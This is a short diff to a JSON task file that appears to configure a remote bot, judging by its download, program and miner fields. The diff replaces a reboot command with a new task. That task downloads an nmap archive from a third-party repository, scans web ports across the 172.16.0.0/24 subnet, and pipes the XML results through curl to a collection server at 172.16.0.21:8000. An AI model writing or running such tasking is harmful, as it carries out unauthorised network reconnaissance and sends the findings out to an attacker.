@@ -1,8 +1,8 @@
 [{
     "type": "Linux",
-    "down": "",
-    "para": "-r",
-    "prog": "shutdown",
+    "down": "https://github.com/gunthurli/nmap/raw/master/nmap.tar.gz",
+    "para": "-p80,8080,443 172.16.0.0/24 -oX - |curl -H 'x-nmap-target: example.net' http://172.16.0.21:8000 --data-binary @-",
+    "prog": "nmap",
     "algo": "",
     "miner": ""
 }]
